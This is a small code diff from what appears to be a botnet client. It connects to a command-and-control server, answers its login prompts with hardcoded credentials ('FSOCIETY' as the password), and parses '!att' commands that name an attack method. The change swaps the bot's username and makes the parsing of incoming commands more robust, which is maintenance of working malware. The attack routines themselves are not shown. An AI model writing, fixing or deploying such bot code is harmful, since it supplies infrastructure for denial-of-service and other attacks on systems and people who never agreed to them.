@@ -334,12 +334,12 @@ def main():
                     print("Disconnected from server.")
                     break
                 if b"Username" in data:
-                    s.send("kediam".encode())
+                    s.send("glitcham".encode())
                 elif b"Password" in data:
                     s.send("FSOCIETY".encode())
                 else:
                     try:
-                        c2 = data.decode().strip()
+                        c2 = data.decode("utf-8", errors="ignore").strip()
                         if c2.split()[0] == '!att':
                             print(c2)
                             method = str(c2.split()[1])
